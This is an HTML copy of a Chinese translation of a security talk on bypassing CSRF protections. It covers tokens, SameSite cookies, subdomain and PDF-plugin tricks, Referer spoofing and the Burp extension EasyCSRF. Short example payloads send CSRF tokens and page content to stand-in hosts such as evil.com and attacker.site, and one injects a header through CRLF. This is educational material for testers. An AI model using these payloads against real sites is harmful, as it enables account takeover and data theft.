<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Neat tricks to bypass CSRF-protection</title>
</head>
<body>
<p><a href="https://zhuanlan.zhihu.com/p/32716181">原文</a></p>
<div class="title-image"><img src="https://pic3.zhimg.com/v2-51734b036d371daf149f026fefa03126_r.jpg" alt=""></div><h2><b>概述 </b></h2><p>在 2017 年的 OWASP （开放应用程序安全策略）Top 10 中，CSRF 漏洞排名<a href="http://www.freebuf.com/news/131778.html">第八</a>，Bugcrowd 的漏洞评级分类中也把 CSRF 漏洞划为 <a href="https://bugcrowd.com/vulnerability-rating-taxonomy">P2 （高危）等级</a>。为什么 CSRF 如此频繁发生呢？</p><p>可能有如下几个原因： </p><ol><li>大多数的 web 应用仍然采用 cookie 来进行会话管理；</li><li>cookie 的<a href="https://www.anquanke.com/post/id/83773">SameSite</a> 属性也没有得到广泛的应用，目前只有 Chrome 和 Opera 浏览器支持这种用法，并且在服务端还需要做一些修改 ；</li><li>大多数 CSRF 防护措施都是可以绕过的。</li></ol><p>这篇文章先介绍 CSRF 的一些绕过手法，然后介绍一个 burpsuite 中的自动化插件 EasyCSRF，以帮我们完成繁杂的手动检测工作。</p><h2><b>常见的 CSRF 防护措施 </b></h2><p>CSRF攻击，简单地说，是攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾经认证过的网站并执行一些操作（如发邮件、发消息、甚至财产操作如转账和购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去执行。这利用了web中用户身份验证的一个漏洞：简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。 </p><ul><li><b>CSRF-token </b></li></ul><p>在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p><ul><li><b>cookie双重提交(验证cookie内容)</b> </li></ul><p>除了请求中发送的本地 cookie，额外再要求提交一次 cookie，如果无法提供 cookie 内容并通不过验证，则认为可能是 CSRF 攻击而拒绝该请求。 </p><ul><li><b>Content-Type验证</b> </li><li><b>Referer验证（验证请求来源)</b> </li></ul><p>Http 协议头中的 Referer 主要用来让服务器判断来源页面, 即用户是从哪个页面来的,通常被网站用来统计用户来源,是从搜索页面来的、还是从其他网站链接过来、或是从书签等访问,以便网站合理定位. </p><p>Referer 有时也被用作防盗链, 即下载时判断来源地址是不是在网站域名之内, 否则就不能下载或显示。很多网站,如天涯就是通过 Referer 页面来判断用户是否能够下载图片，如果 referer 指向的页面来源不是同一网站，则认为可能是 CSRF 攻击而拒绝该请求 。</p><ul><li><b>口令确认</b> </li></ul><p>无法使用cookie直接验证身份，必须还要输入正确的密码口令才可以通过验证。 </p><ul><li><b>Samesite</b> <b>cookies（目前只有chrome和</b> <b>Opera采用了此属性）</b> </li></ul><p>Samesite Cookie 是 Set-Cookie 响应头新增的属性，它用来标明这个 cookie 是个”同站 cookie”，同站 cookie 只能作为第一方 cookie，不能作为第三方 cookie。SameSite 有两个属性值，分别是 Strict 和 Lax，下面分别讲解： </p><p><b>SameSite=Strict： </b></p><p>严格模式，表明这个 cookie 在任何情况下都不可能作为第三方 cookie，绝无例外。比如说假如 b.com 设置了如下 cookie： </p><code lang="text">Set-Cookie: foo=1; SameSite=Strict  
Set-Cookie: bar=2 </code><p>你在 a.com 下发起的对 b.com 的任意请求中，foo 这个 cookie 都不会被包含在 Cookie 请求头中，但 bar 会。举个实际的例子就是，假如淘宝网站用来识别用户登录与否的 cookie 被设置成了 SameSite=Strict，那么用户从百度搜索页面甚至天猫页面的链接点击进入淘宝后，淘宝都不会是登录状态，因为淘宝的服务器不会接受到那个 cookie，其它网站发起的对淘宝的任意请求都不会带上那个 cookie。 </p><p><b>SameSite=Lax： </b></p><p>宽松模式，比 Strict 放宽了点限制：假如这个请求是我上面总结的那种同步请求（改变了当前页面或者打开了新页面）且同时是个 GET 请求（因为从语义上说 GET 是读取操作，比 POST 更安全），则这个 cookie 可以作为第三方 cookie。比如说假如 b.com 设置了如下 cookie： </p><code lang="text">Set-Cookie: foo=1; SameSite=Strict  
Set-Cookie: bar=2; SameSite=Lax  
Set-Cookie: baz=3 </code><p>当用户从 a.com 点击链接进入 b.com 时，foo 这个 cookie 不会被包含在 Cookie 请求头中，但 bar 和 baz 会，也就是说用户在不同网站之间通过链接跳转是不受影响了。但假如这个请求是从 a.com 发起的对 b.com 的异步请求，或者页面跳转是通过表单的 post 提交触发的，则 bar 也不会发送。 </p><p>可以参考这篇<a href="http://www.cnblogs.com/ziyunfei/p/5637945.html">文章</a>。 </p><p><b>CSRF 的绕过 </b></p><p>CSRF 绕过方法大致有如下几种： </p><ol><li>跨站脚本攻击 </li><li>HTML标签注入(<a href="http://lcamtuf.coredump.cx/postxss/">Dangling markup</a>) </li><li>子域绕过 </li><li>Cookie注入 </li><li>改变Content-Type </li><li>复杂的Content-Type(Non-simple Content-Type) </li><li>PDF插件(Bad Pdf) </li><li>Referer伪造(Referer spoof) </li></ol><img src="https://pic3.zhimg.com/v2-335356a31ee6c19813241a0ae47e4549_r.jpg" data-caption="CSRF防护有效绕过 " data-size="normal" data-rawwidth="1277" data-rawheight="554"><p>接下来分别介绍它们： </p><p><b>XSS绕过 </b></p><p>XSS 可以绕过 Web 系统和应用中大部分的防护，比如通过 XSS 来盗取用户的 Cookie，以此来伪装成真实用户达到 CSRF 攻击的目的。 </p><p><b>HTML标签注入</b> </p><p>由于 CSP——内容安全策略等限制，在 web 系统和应用中不能进行 XSS 而只能通过 HTML注入.借此攻击者可以获取到 CSRF-token 的内容 </p><code lang="html">&lt;img src=”http://evil.com/log_csrf?html=”&gt; 
&lt;form action=”http://evil.com/log_csrf”&gt;&lt;textarea&gt; </code><p><b>子域绕过</b> </p><p>（1）如果子域(例如: foo.example.com)能够轻易被 XSS 攻击、子域劫持或者 cookie 注入，那么攻击者可以轻易绕过 CSRF-token 验证、cookie 双重提交验证和 Content-Type 验证。 </p><p>（2）Web系统和应用采取CORS(跨域资源共享)来与子域通信时，相关的响应如下: </p><code lang="text">Access-Control-Allow-Origin:https://foo.example.com   
 Access-Control-Allow-Credentials:True;                     </code><p>攻击者可以通过子域读取到主域 CSRF-token 的内容. </p><p>（3）子域(foo.example.com)存在XSS漏洞，主域包含文件crossdomain.xml: </p><code lang="xml">&lt;cross-domain-policy&gt; 
&lt;allow-access-from-domain=”*.example.com” /&gt;  //允许所有的子域跨域访问 
&lt;/cross-domain-policy&gt; </code><p>攻击者可以上传 JS 文件到 foo.example.com，然后利用 <a href="http://foo.example.com/">foo.example.com</a> 的 Service Worker 通过 Flash 读取 CSRF-token 内容： </p><code lang="js">Var url=“http：//attacker.Com/bad.swf”; 
Onfetch=(e)=&gt;{                  //FetchEvent API 
 e.respondWith(fetch(url));     //respondWith方法包裹访问URL返回的响应代码 
} </code><p>如: Amazon 的 CSRF-token 绕过 (<a href="https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/">https://ahussam.me/Amazon-leaking-csrf-token-using-service-worker/</a>) </p><p>（4）攻击者可以向父域或者任意目标路径注入 cookie，浏览器会选择路径明确的 cookie，也就是我们注入的 cookie，这可以用来绕过 cookie 双重提交验证 </p><p><b>PDF插件绕过</b> </p><p>Adobe 的 PDF 插件(在线 PDF 文件查看)支持 FormCalc 脚本语言，目前被 IE11 和 Firefox ESR 支持。而 Form 的 Get 和 post 方法可能泄露 CSRF-token。 </p><p>假设攻击者可以上传 PDF 文件到 <a href="http://example.com/">example.com</a> 站点，被上传的文件能被目标网站example.com的 api 所解析，不过这里要注意的是，最好以别的形式上传文件，比如图片等等。另外，PDF 插件是不会关心 Content-Type 或  Content-Disposition 头的，大胆尝试各种姿势吧。 </p><p>看如下一个例子： </p><p><b>Leak.pdf</b> </p><img src="https://pic3.zhimg.com/v2-3f3ce4665508d507191722724de443bf_r.jpg" data-caption="" data-size="normal" data-rawwidth="480" data-rawheight="384"><code lang="html">&lt;script contentType=”application/x-formcalc”&gt;          
         Var content=GET(“https://example.com/Settings.action”);   
         Post(“http://attacker.site/loot”,content,”text/plain”); 
&lt;/script&gt; </code><img src="https://pic3.zhimg.com/v2-b3ca402fd4abd81d3ac803e38a7742cb_r.jpg" data-caption="" data-size="normal" data-rawwidth="485" data-rawheight="121"><p><b>Cookie注入绕过</b> </p><p>攻击者可以通过Cookie注入绕过cookie双重提交验证 </p><p>    几种Cookie注入: </p><p>1.CRLF 注入 </p><p>攻击者可以通过在一段数据中加入CRLF命令来改变接受这个数据的应用程序处理这个数据的方式 </p><p>2.浏览器漏洞利用(如火狐的 CVE-2016-9078） </p><p>3.等等。。  </p><p><b>Content-Type伪造绕过</b> </p><p>开发者认为非标准格式的数据就可以有效的阻止CSRF, 但有时后端并不会检测  Content-Type头  </p><p>比如， 借助PDF插件来修改 Content-Type，从而通过验证 </p><img src="https://pic1.zhimg.com/v2-981e388b7081de702fb3240dd611306a_r.jpg" data-caption="" data-size="normal" data-rawwidth="483" data-rawheight="148"><p><br></p><img src="https://pic4.zhimg.com/v2-d9b354bbe9f7e25816264e6614633785_r.jpg" data-caption="" data-size="normal" data-rawwidth="483" data-rawheight="204"><p><b>任意Content-Type绕过:</b> </p><p>攻击者通过 HTML 表单或者 XHR(XMLHttpReques) API 攻击者只能发送一些简单的Content_type: </p><p>如： </p><code lang="text">Text/plain 
application/x-www-form-urlencoded 
multipart/form-data </code><p>那要怎么去发送任意的 Content-Type 头呢: </p><p>1、浏览器漏洞 (Chrome 的 navigator.sendBeacon 方法)  </p><p>2、Flash 插件 和 307 临时重定向  </p><p>3、PDF 插件和 307 临时重定向  </p><p>4、一些后端框架支持 URL 参数重定义 Content-Type 的, <a href="http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging">http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging</a> </p><p><a href="http://xn--chrome:-bu3kgmm36rd7pnkf871a174f/">这是Chrome的一个漏洞：</a><b><a href="https://zhuanlan.zhihu.com/p/32716181/h%3C/b%3Ettps://bugs.chromium.org/p/chromium/issues/detail?id=490015">Chrome Bug </a> ，最近两年很常见 ，Nabigator.sendBeacon()方法支持以任意content-Type发送POST请求 </b></p><p>如下： </p><img src="https://pic4.zhimg.com/v2-42e3d0f56da562ef9985fcb02c417162_r.jpg" data-caption="" data-size="normal" data-rawwidth="493" data-rawheight="180"><img src="https://pic2.zhimg.com/v2-9458a21d33283e9b4892e72b9221ffad_r.jpg" data-caption="" data-size="normal" data-rawwidth="513" data-rawheight="255"><p><b>Referer伪造绕过</b> </p><p>MS Edge的<a href="https://www.brokenbrowser.com/referer-spoofing-patch-bypass/">漏洞</a> ,此漏洞依然可以利用但是仅限于get请求,而有的后端程序不区分GET和POST请求，那就可以大胆去尝试了。  </p><img src="https://pic3.zhimg.com/v2-a6f3e9e07e77bbf2a484306f175ad53c_r.jpg" data-caption="" data-size="normal" data-rawwidth="499" data-rawheight="269"><code lang="html">&lt;script contentType='application/x-formcalc'&gt; 
Post("http://attacker.com:8888/redirect", 
"{""action"":""add-user-email"",""Email"":""attacker@evil.com""}", "application/json&amp;#x0a;&amp;#x0d;Referer;&amp;#x20;http://example.com")  
&lt;/script&gt; </code><p>PDF 插件发送 HTTP头 </p><code lang="text">Referer http://example.com 
 Name:Value </code><p>一些后台(Jboss/WildFly等)会将空格当作冒号(HTTP头的末尾) </p><code lang="text">Referer http://example.com 
 Name:Value </code><p>漏洞挖掘者可以从这几方面入手： </p><p>1有许多的API都存在基于 Content-Type的CSRF防护 </p><p>2 检查子域是否存在漏洞(XSS,子域名接管，cookie注入) </p><p>3  PDF上传的技巧有时也可以试试 </p><p>4 将带有CSRF-token的url编码 body转换成没有CSRF-token的JSON格式 </p><p><b>Burp 中的 EasyCSRF 扩展</b> </p><p>EasyCSRF 在 BurpSuite 的免费版中就可以使用 </p><p><a href="https://github.com/0ang3el/EasyCSRF">下载地址</a> </p><p>EasyCSRF 作为代理监听请求 (IProxyListener): </p><ul><li>不停修改请求 (移除CSRF参数/头，改变请求方法等） </li><li>高亮显示已修改的请求 </li><li>可以直观的看到修改的请求是否执行成</li></ul><img src="https://pic2.zhimg.com/v2-f4fd2d5e708a8757c3a924cfbe30e028_r.jpg" data-caption="主界面" data-size="normal" data-rawwidth="507" data-rawheight="319"><img src="https://pic2.zhimg.com/v2-55ec299974251d04bf850dfe6b3007e8_r.jpg" data-caption="修改前" data-size="normal" data-rawwidth="507" data-rawheight="276"><img src="https://pic3.zhimg.com/v2-67315d650b33e8b4c9da19c2563b8d29_r.jpg" data-caption="修改后" data-size="normal" data-rawwidth="511" data-rawheight="268"><p>可以看到 EasyCSRF 把 PUT 方法改成了 POST 方法, 移除了 Origin 头，并在历史 url 中高亮请求 。</p><p>原文：<a href="https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection">https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection</a></p><p></p>
<script async defer="defer" src="https://www.googletagmanager.com/gtag/js?id=UA-7909075-5"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){ dataLayer.push(arguments); }
gtag('js', new Date());
gtag('config', 'UA-7909075-5');
</script>
<script>
var _hmt = _hmt || [];
</script>
<script async defer="defer" src="https://hm.baidu.com/hm.js?e3d40295e416616ddc21287da9646d31"></script>
</body>
</html>
